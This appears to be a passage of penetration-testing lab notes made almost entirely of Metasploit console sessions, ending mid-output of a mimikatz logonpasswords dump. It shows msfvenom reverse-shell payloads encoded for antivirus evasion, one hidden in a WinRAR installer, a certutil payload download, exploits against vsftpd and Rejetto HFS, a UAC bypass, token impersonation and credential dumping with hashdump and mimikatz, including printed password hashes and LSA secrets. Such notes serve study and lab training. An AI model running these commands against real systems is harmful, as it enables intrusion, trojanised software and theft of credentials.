    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
    x86/xor_poly                  normal     XOR POLY Encoder
```

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > /tmp/windowsx86EncodedPayload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes

$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.6 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f elf > /tmp/linuxx86EncodedPayload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 150 (iteration=0)
x86/shikata_ga_nai succeeded with size 177 (iteration=1)
x86/shikata_ga_nai succeeded with size 204 (iteration=2)
x86/shikata_ga_nai succeeded with size 231 (iteration=3)
x86/shikata_ga_nai succeeded with size 258 (iteration=4)
x86/shikata_ga_nai succeeded with size 285 (iteration=5)
x86/shikata_ga_nai succeeded with size 312 (iteration=6)
x86/shikata_ga_nai succeeded with size 339 (iteration=7)
x86/shikata_ga_nai succeeded with size 366 (iteration=8)
x86/shikata_ga_nai succeeded with size 393 (iteration=9)
x86/shikata_ga_nai chosen with final size 393
Payload size: 393 bytes
Final size of elf file: 477 bytes
```

### Use Existing Binary

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.6 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -x /home/ehogue/Downloads/winrar-x32-624.exe > /tmp/winrar.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 3311280 bytes
```

Download in Windows
```bash
certutil -urlcache -f http://10.10.22.8/met.exe met.exe
```

## Linux Exploitation

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set LHOST 192.169.220.2
LHOST => 192.169.220.2
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.169.220.2:4433
[*] Sending stage (985320 bytes) to 192.169.220.3
[*] Meterpreter session 2 opened (192.169.220.2:4433 -> 192.169.220.3:56474) at 2024-02-07 11:29:53 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKncAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/sdmHQ.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/cSqeC' < '/tmp/sdmHQ.b64' ; chmod +x '/tmp/cSqeC' ; '/tmp/cSqeC' & sleep 2 ; rm -f '/tmp/cSqeC' ; rm -f '/tmp/sdmHQ.b64'"
[-] Output: "[1] 43"
[*] Stopping exploit/multi/handler
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.169.220.2:43371 -> 192.169.220.3:6200 (192.169.220.3)
  2         meterpreter x86/linux               192.169.220.2:4433 -> 192.169.220.3:56474 (192.169.220.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.169.220.3
OS           : Debian 9.5 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

## Meterpreter

```bash
meterpreter > checksum md5 /bin/bash
164ebd6889588da166a52ca0d57b9004  /bin/bash
meterpreter > getenv PATH

Environment Variables
=====================

Variable  Value
--------  -----
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

meterpreter > search -d /usr/bin -f *backdoor*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
meterpreter > search -f *.php
Found 5 results...
    .\config.php (1284 bytes)
    .\functions.php (40563 bytes)
    .\index.php (57739 bytes)
    .\phpinfo.php (19 bytes)
    .\zipstream.php (18850 bytes)


meterpreter > shell
Process 874 created.
Channel 7 created.
/bin/bash -i
bash: cannot set terminal process group (478): Inappropriate ioctl for device
bash: no job control in this shell
www-data@victim-1:/app$
```

## Post Exploitation

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed   29.66 GiB      8.49 GiB


Total mounts/drives: 1
```

```bash
msf5 post(windows/manage/migrate) > use post/windows/gather/win_privs
msf5 post(windows/gather/win_privs) > options

Module options (post/windows/gather/win_privs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/win_privs) > setg SESSION 1
SESSION => 1
msf5 post(windows/gather/win_privs) > run

Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 True      False      True                     True         1              WIN-OMCNBKR66MN\Administrator

Windows Privileges
==================

 Name
 ----
 SeBackupPrivilege
 SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege
 SeCreatePagefilePrivilege
 SeCreateSymbolicLinkPrivilege
 SeDebugPrivilege
 SeImpersonatePrivilege
 SeIncreaseBasePriorityPrivilege
 SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 SeLoadDriverPrivilege
 SeManageVolumePrivilege
 SeProfileSingleProcessPrivilege
 SeRemoteShutdownPrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
 SeSystemEnvironmentPrivilege
 SeSystemProfilePrivilege
 SeSystemtimePrivilege
 SeTakeOwnershipPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege

[*] Post module execution completed
msf5 post(windows/gather/win_privs) > search enum_logged

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/windows/gather/enum_logged_on_users                   normal  No     Windows Gather Logged On User Enumeration (Registry)


msf5 post(windows/gather/win_privs) > use post/windows/gather/enum_logged_on_users
msf5 post(windows/gather/enum_logged_on_users) > options

Module options (post/windows/gather/enum_logged_on_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently logged on users
   RECENT   true             yes       Enumerate Recently logged on users
   SESSION  1                yes       The session to run this module on.

msf5 post(windows/gather/enum_logged_on_users) > run

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator


[+] Results saved in: /root/.msf4/loot/20240208060121_post_10.4.21.48_host.users.activ_152458.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator


[*] Post module execution completed

msf5 post(windows/gather/enum_logged_on_users) > use post/windows/gather/checkvm
msf5 post(windows/gather/checkvm) > options

Module options (post/windows/gather/checkvm):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf5 post(windows/gather/checkvm) > run

[*] Checking if WIN-OMCNBKR66MN is a Virtual Machine .....
[+] This is a Xen Virtual Machine
[*] Post module execution completed

msf5 post(windows/gather/checkvm) > use post/windows/gather/enum_applications
msf5 post(windows/gather/enum_applications) > options

Module options (post/windows/gather/enum_applications):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf5 post(windows/gather/enum_applications) > run

[*] Enumerating applications installed on WIN-OMCNBKR66MN

Installed Applications
======================

 Name                                Version
 ----                                -------
 AWS PV Drivers                      8.3.3
 AWS Tools for Windows               3.15.1084
 Amazon SSM Agent                    2.3.842.0
 Amazon SSM Agent                    2.3.842.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1
 Mozilla Maintenance Service         80.0.1
 aws-cfn-bootstrap                   1.4.33


[+] Results stored in: /root/.msf4/loot/20240208060421_post_10.4.21.48_host.application_139406.txt
[*] Post module execution completed

```

```bash
msf5 post(windows/gather/enum_applications) > loot

Loot
====

host        service  type               name              content     info                    path
----        -------  ----               ----              -------     ----                    ----
10.4.21.48           host.users.active  active_users.txt  text/plain  Active Users            /root/.msf4/loot/20240208060121_post_10.4.21.48_host.users.activ_152458.txt
10.4.21.48           host.users.recent  recent_users.txt  text/plain  Recent Users            /root/.msf4/loot/20240208060121_post_10.4.21.48_host.users.recen_199398.txt
10.4.21.48           host.applications  applications.txt  text/plain  Installed Applications  /root/.msf4/loot/20240208060421_post_10.4.21.48_host.application_139406.txt

msf5 post(windows/gather/enum_applications) > cat /root/.msf4/loot/20240208060421_post_10.4.21.48_host.application_139406.txt
[*] exec: cat /root/.msf4/loot/20240208060421_post_10.4.21.48_host.application_139406.txt

Installed Applications
======================

 Name                                Version
 ----                                -------
 AWS PV Drivers                      8.3.3
 AWS Tools for Windows               3.15.1084
 Amazon SSM Agent                    2.3.842.0
 Amazon SSM Agent                    2.3.842.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1
 Mozilla Maintenance Service         80.0.1
 aws-cfn-bootstrap                   1.4.33
```

```bash
msf5 post(windows/gather/enum_applications) > use post/windows/gather/enum_av_excluded
msf5 post(windows/gather/enum_av_excluded) > options

Module options (post/windows/gather/enum_av_excluded):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   DEFENDER    true             yes       Enumerate exclusions for Microsoft Defender
   ESSENTIALS  true             yes       Enumerate exclusions for Microsoft Security Essentials/Antimalware
   SEP         true             yes       Enumerate exclusions for Symantec Endpoint Protection (SEP)
   SESSION     1                yes       The session to run this module on.

msf5 post(windows/gather/enum_av_excluded) > run

[*] Enumerating Excluded Paths for AV on WIN-OMCNBKR66MN
[+] Found Windows Defender
[*] No extension exclusions for Windows Defender
[*] No path exclusions for Windows Defender
[*] No process exclusions for Windows Defender
[*] Post module execution completed
```

```bash
msf5 post(windows/gather/enum_av_excluded) > use post/windows/gather/enum_computers
msf5 post(windows/gather/enum_computers) > options

Module options (post/windows/gather/enum_computers):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf5 post(windows/gather/enum_computers) > run

[*] Running module against WIN-OMCNBKR66MN
[-] This host is not part of a domain.
[*] Post module execution completed
```

```bash
msf5 post(windows/gather/enum_patches) > use post/windows/gather/enum_shares
msf5 post(windows/gather/enum_shares) > options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate Recently mapped shares
   SESSION  1                yes       The session to run this module on.

msf5 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] The following shares were found:
[*] 	Name: print$
[*]
[*] Post module execution completed
```

```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
se[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.4.17.216      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.23.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.23.3:4444
[*] Using URL: http://0.0.0.0:8080/AMT5sldrjT
[*] Local IP: http://10.10.23.3:8080/AMT5sldrjT
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /AMT5sldrjT
[*] Sending stage (200262 bytes) to 10.4.17.216
[*] Meterpreter session 1 opened (10.10.23.3:4444 -> 10.4.17.216:49236) at 2024-02-08 06:26:24 +0530
[!] Tried to delete %TEMP%\HtJCKVqfHXlaTz.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin

meterpreter > getsystem
[-] 2001: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > shell
Process 1768 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
net users

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest
The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.

msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/bypassuac_injection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/bypassuac_injection) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > options

Module options (exploit/windows/local/bypassuac_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.23.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac_injection) > set LPORT 1234
LPORT => 1234

msf6 exploit(windows/local/bypassuac_injection) > run

[*] Started reverse TCP handler on 10.10.23.3:1234
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 1488
[*] Sending stage (200262 bytes) to 10.4.17.216
[*] Meterpreter session 2 opened (10.10.23.3:1234 -> 10.4.17.216:49280) at 2024-02-08 06:35:31 +0530

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

#### Token Impersonation

```bash
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.

meterpreter > pgrep explorer.exe
3468
meterpreter > migrate 3468
[*] Migrating from 3244 to 3468...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

#### Mimikatz

```bash
meterpreter > pgrep lsass
596
meterpreter > migrate 596
[*] Migrating from 4948 to 596...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help

...
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)


meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b


meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
```

```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe

C:\Windows\system32>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2504427 (00000000:002636eb)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
